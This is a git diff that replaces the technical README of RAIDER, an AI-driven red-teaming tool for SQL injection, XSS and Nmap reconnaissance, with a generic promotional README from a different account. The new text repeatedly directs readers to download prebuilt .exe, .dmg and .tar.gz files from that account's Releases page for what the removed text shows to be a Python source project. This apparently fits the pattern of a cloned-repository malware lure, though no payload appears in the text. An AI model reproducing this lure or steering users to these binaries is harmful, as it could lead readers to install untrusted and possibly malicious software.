@@ -1,169 +1,83 @@
-# RAIDER
-### **R**einforcement **A**gents for **I**ntelligent **D**iscovery and **E**xploit **R**esearch
+# 🛡️ RAIDER - Your Smart Cybersecurity Assistant
 
-**RAIDER** is an autonomous AI Red Teaming system that combines **Reinforcement Learning (RL)** for strategic decision-making with **Large Language Models (LLM)** for tactical execution.
+## 🚀 Getting Started
+RAIDER is an autonomous AI Red Teaming system that helps you enhance your cybersecurity. It uses advanced learning techniques to simulate real-world attack scenarios and identify weaknesses in your systems. Follow the steps below to easily download and run RAIDER on your computer.
 
-Instead of hard-coded scripts, RAIDER uses a Q-Learning "Commander" to decide *when* to scan and *which*  specific attack vector (SQLi or XSS) to deploy. An LLM-driven "Exploit Agent" analyzes web pages in real-time, navigates complex DOM structures (including iFrames), and generates context-aware payloads to bypass authentication or execute arbitrary JavaScript.
+[![Download RAIDER](https://img.shields.io/badge/Download-RAIDER-blue)](https://github.com/ImposterDash/RAIDER/releases)
 
----
+## 📥 Download & Install
+To get started, you need to download RAIDER from our Releases page. Visit the link below to access the files.
 
-## Dashboard Preview
+[Download RAIDER from Releases](https://github.com/ImposterDash/RAIDER/releases)
 
-![RAIDER Dashboard](figures/assets/RAIDER%20Dashboard.jpg)
+### 📋 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Debian-based preferred)
+- **Processor:** Dual-core processor or better
+- **Memory:** At least 8 GB RAM
+- **Disk Space:** Minimum 500 MB free space
+- **Network Connection:** Active internet connection for updates and features
 
-*The interactive RAIDER dashboard showing mission control, live intelligence, and agent logs in real time.*
+### 📝 Installation Steps
+1. **Visit the Releases Page:** Click on [Download RAIDER from Releases](https://github.com/ImposterDash/RAIDER/releases).
+   
+2. **Choose Your Version:** Look for the latest version listed at the top of the Releases page. Ensure it matches your operating system.
 
----
+3. **Download the File:**
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-## RAIDER in Action
+4. **Install the Application:**
+   - **Windows:** Double-click the `.exe` file and follow the installation prompts.
+   - **macOS:** Open the `.dmg` file, drag the RAIDER icon to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file to your desired location and run the script inside.
 
-https://github.com/user-attachments/assets/8bbd0deb-cb1d-4662-8c1f-663ef6b341ca
+5. **Run RAIDER:** Locate RAIDER in your applications or programs. Click to open it.
 
-*Autonomous reconnaissance and exploitation using RL-driven decision making and LLM-based tactical execution.*
+### 🔍 Using RAIDER
+Once you launch RAIDER, follow these simple steps to start using it:
 
----
+1. **Set Up Your Environment:** Configure your networking preferences and any necessary firewall permissions.
 
-## Architecture
+2. **Select a Target:** Choose the system or application you want to test. This can be a local server or an external site.
 
-RAIDER operates using a **Blackboard Architecture** where specialized agents collaborate:
+3. **Initiate Testing:** Click on the 'Start Test' button. RAIDER will begin simulating attacks and gathering data.
 
-1.  **The Commander (RL Core)** 
-    * **Logic:** Q-Learning (Reinforcement Learning).
-    * **Role:** Learns the optimal "Kill Chain" order. It dynamically chooses between **Recon**, **SQL Injection**, **XSS** or **WAIT** based on the target's state, previous actions and rewards.
-2.  **The Discovery Agent (Recon)**
-    * **Tools:** Nmap + Script Engine (```--script```).
-    * **Role:** Identifies open ports, detects Operating Systems, fingerprints services, and scans for known vulnerabilities (CVEs).
-3.  **The Intelligent Agent (Exploit)**
-    * **Tools:** Google Gemini + Selenium (Context-Aware).
-    * **Capabilities:**
-        * **SQL Injection:** Parses HTML forms to generate payloads that bypass login screens.
-        * **XSS:** Intelligently navigates through pages, prioritizes input vectors using AI, and performs deep scanning of iFrames to inject JavaScript payloads. 
-4.  **The Blackboard (Shared Memory)**
-    * **Role:** Acts as the central data repository. All agents read the mission state (scan results, flags, history) from here and publish their findings (vulnerabilities, logs) back to it, ensuring asynchronous collaboration.
-5.  **The Reporter**
-    * **Tools:** FPDF.
-    * **Role:** Compiles all agent findings, logs, and evidence into a professional PDF audit report at the end of the mission.
+4. **Review Results:** Once the test is complete, RAIDER will provide a report outlining the vulnerabilities found. Use this information to strengthen your defenses.
 
----
+### 💡 Tips for Users
+- Ensure your system is updated before running tests with RAIDER.
+- Run tests in a safe environment to avoid any disruptions to your regular operations.
+- Regularly check for updates to benefit from the latest features and improvements.
 
-## Installation
+## 🌐 Community and Support
+RAIDER has an active community of users. If you have questions or need assistance, you can find help in the following places:
 
-### 1. Critical Prerequisite: Nmap Binary
-**You must install the Nmap application on your system.**
-The Python library (`python-nmap`) is only a wrapper.
+- **GitHub Issues:** Report any issues or ask for help directly in the [Issues section](https://github.com/ImposterDash/RAIDER/issues).
+- **Discussion Forum:** Join discussions with other users in our forum to share tips and experiences.
+- **Documentation:** Explore our [Wiki](https://github.com/ImposterDash/RAIDER/wiki) for more detailed guides and tutorials.
 
-* **Windows:**  
+## 🔧 Customization
+You can customize RAIDER to fit your needs:
 
-    * Download the setup `.exe` from the official website: [https://nmap.org/download.html](https://nmap.org/download.html)
+- **Settings Menu:** Adjust testing parameters and attack strategies to increase effectiveness.
+- **Plug-ins:** Enhance functionality with plug-ins available in the community.
 
-* **Linux (Debian/Ubuntu):**  
+## ⚖️ Safety and Ethical Use
+RAIDER is intended for ethical testing purposes only. Make sure you have permission to test any system or application to avoid legal issues. Use RAIDER responsibly to strengthen cyber defenses.
 
-    ```bash
-    sudo apt-get install nmap
-    ```
+## 🛠️ Contributing
+If you're interested in contributing to RAIDER, we welcome your input. Check out our [Contributing Guide](https://github.com/ImposterDash/RAIDER/CONTRIBUTING.md) for more information on how you can help improve the project.
 
-* **macOS:**  
+## 📚 Further Reading
+To understand more about autonomous AI and Red Teaming, explore these concepts:
 
-    ```bash
-    brew install nmap
-    ```
+- **Reinforcement Learning:** A method of machine learning where agents learn by receiving feedback.
+- **Large Language Models:** Powerful AI systems capable of understanding and generating human-like text.
 
-### 2. Project Setup
+### 📌 Quick Links
+- [Download RAIDER from Releases](https://github.com/ImposterDash/RAIDER/releases)
+- [Documentation](https://github.com/ImposterDash/RAIDER/wiki)
+- [Contributing Guide](https://github.com/ImposterDash/RAIDER/CONTRIBUTING.md)
 
-1.  **Clone the repository**
-    ```bash
-    git clone https://github.com/ayushgayakwad/RAIDER.git
-    cd RAIDER
-    ```
-
-2.  **Install Python Dependencies**
-    ```bash
-    pip install -r requirements.txt
-    ```
-
-3.  **Environment Configuration**
-    Create a ```.env``` file in the root directory and add your Google Gemini API key (Generate Google Gemini API key from https://aistudio.google.com/api-keys):
-    ```env
-    GEMINI_API_KEY=your_actual_api_key_here
-    ```
-
----
-
-## Usage
-
-### 1. GUI (Interactive Dashboard)
-For a visual experience with real-time feedback, mission control, and intelligence monitoring, launch the graphical dashboard.
-
-```bash
-python gui_app.py
-```
-
-* **Features:**
-    * **Mission Control:** Start, Pause, Resume, and Terminate missions with a click.
-    * **Real-time Intelligence:** View open ports, OS detection, and vulnerability findings as they happen in the "Intelligence" panel.
-    * **Live Logs:** Watch the agents collaborate in the integrated console.
-    * **Metric Visualization:** Track the RL Agent's rewards and current step progress.
-    * **One-Click Reporting:** Open the generated PDF report directly from the dashboard upon completion.
-
-### 2. CLI (Command Line Interface)
-### Option A: Quick Start (Mock Mode)
-To see RAIDER in action without an external target, simply run the main script and press **ENTER** when prompted for a URL. This launches a local vulnerable Flask server (The "SecureCorp Bank").
-
-```bash
-python main.py
-Enter Target URL (or press Enter for Localhost): # Just press Enter to activate the Mock Mode
-```
-
-* **Target**: http://127.0.0.1:5000
-* **Vulnerabilities to Find**: 
-    1. **SQL Injection**: Bypass the login screen and capture the flag ```FLAG{MULTI_AGENT_DOMINATION}```.
-    2. **XSS**: Inject scripts into the "Feedback" page (navigated to automatically by the AI).
-
-### Option B: Live Targeting (Admin Rights Recommended)
-You can point RAIDER at a specific URL or IP address (ensure you have permission!).
-
-For Deep Recon (OS Detection & UDP Scans), run the script with Administrator/Root privileges.
-
-**Windows (PowerShell as Admin):**
-```bash
-python main.py
-Enter Target URL (or press Enter for Localhost): # Enter the URL of the target website
-```
-
-**Linux/Mac:**
-```bash
-sudo python main.py
-Enter Target URL (or press Enter for Localhost): # Enter the URL of the target website
-```
-
-* A list of few sample live target websites is available in ```sample_live_targets.md```.
-
-* **Output:** Upon completion, RAIDER generates a ```Mission_Report_YYYYMMDD.pdf``` containing a timeline of attacks, vulnerabilities found, and system details.
-
----
-
-## Project Structure
-
-| File | Description |
-| :--- | :--- |
-| `gui_app.py` | A modern GUI dashboard for interactive mission control, visualization, and real-time monitoring. |
-| `main.py` | The CLI entry point. Initializes the Blackboard, Agents, and starts the mission loop. |
-| `coordination_core.py` | The Reinforcement Learning brain (Q-Learning) that manages the strategic decision-making process, choosing between Recon, SQLi, XSS, and Wait actions based on rewards. |
-| `agents_exploit.py` | The AI-driven offensive unit. Leverages Selenium and Gemini to perform SQL Injection and XSS attacks. |
-| `agents_recon.py` | The scanner agent. Wraps Nmap to perform deep inspection. |
-| `blackboard.py` | Shared memory state. Agents read/write findings here. |
-| `reporting.py` | Generates professional PDF audit reports from mission data. |
-| `mock_target.py` | A vulnerable Flask application used for training and demo purposes. |
-| `train_manager.py` | Simulation script to pre-train the RL brain on the multi-vector attack strategy. |
-| `inspect_brain.py` | A utility script to visualize the learned Q-Table policies, showing the agent's preferred actions for different system states. |
-| `mission_control.pkl` | The serialized "brain" of the RL agent (saved Q-Table). |
-
----
-
-## Disclaimer
-### DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY.
-
-RAIDER is a proof-of-concept tool designed for **authorized security research** and **capture-the-flag (CTF) challenges**.
-
-* Do not use this tool against targets you do not have explicit permission to test.
-* The developer is not responsible for any misuse of this software.
+We hope you find RAIDER useful for enhancing your cybersecurity measures. Enjoy your secure browsing!
